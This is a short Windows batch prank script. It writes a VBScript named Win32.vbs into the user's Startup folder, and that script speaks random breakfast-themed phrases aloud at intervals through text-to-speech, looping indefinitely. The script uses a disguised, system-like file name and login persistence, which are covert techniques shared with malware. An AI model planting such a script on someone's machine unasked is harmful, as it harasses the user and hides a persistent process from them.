@echo off
:: makes sure we're on system drive - usually C:/
%SystemDrive%

cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: Delete so we create fresh file

del Win32.vbs

:: Begin writing vbs file

echo set sapi = Wscript.CreateObject("SAPI.SpVoice") > Win32.vbs 
echo Dim phrases(4) >> Win32.vbs
echo Dim phrase_max, phrase_min >> Win32.vbs
echo phrase_max = UBound(phrases) >> Win32.vbs
echo phrase_min = 0 >> Win32.vbs

echo Dim rmax, rmin, start, repeat >> Win32.vbs
echo rmax=2000000 >> Win32.vbs
echo rmin=600000 >> Win32.vbs

echo phrases(0)  = "Bring me breakfast" >> Win32.vbs
echo phrases(1)  = "Breakfast please" >> Win32.vbs
echo phrases(2)  = "Croissants or no croissants, that is the question" >> Win32.vbs
echo phrases(3)  = "This is a breakfast hostage situation" >> Win32.vbs
echo phrases(4)  = "Croissant. Breakfast. Croissant. Breakfast. Croissant. Breakfast." >> Win32.vbs

echo do >> Win32.vbs

echo Randomize >> Win32.vbs
echo phrase_selection = Int((phrase_max-phrase_min+1)*Rnd+phrase_min) >> Win32.vbs

echo sapi.speak phrases(phrase_selection) >> Win32.vbs

echo Randomize >> Win32.vbs
echo repeat=(Int((rmax-rmin+1)*Rnd+rmin)) >> Win32.vbs
echo wscript.sleep repeat >> Win32.vbs

echo loop >> Win32.vbs
